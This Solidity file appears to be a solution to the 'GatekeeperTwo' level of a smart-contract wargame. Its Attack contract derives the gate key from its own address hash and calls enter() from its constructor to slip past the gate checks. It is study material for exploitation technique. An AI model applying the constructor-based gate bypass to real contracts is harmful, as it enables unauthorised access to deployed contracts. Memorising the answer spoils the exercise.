// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "forge-std/console.sol";

interface GatekeeperTwo{
    function enter(bytes8 _gateKey) external returns (bool);
}
contract Attack {
    GatekeeperTwo gatekeeper = GatekeeperTwo(0x119cC8770cC621Ca50991f549AD660cE8E6aD8e9);
    bytes8 _gateKey;
    constructor() public{
        _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        //console.logBytes8(_gateKey);
        gatekeeper.enter(_gateKey);    
    }
    function run() public{
        console.logBytes8(_gateKey);
    }
   
}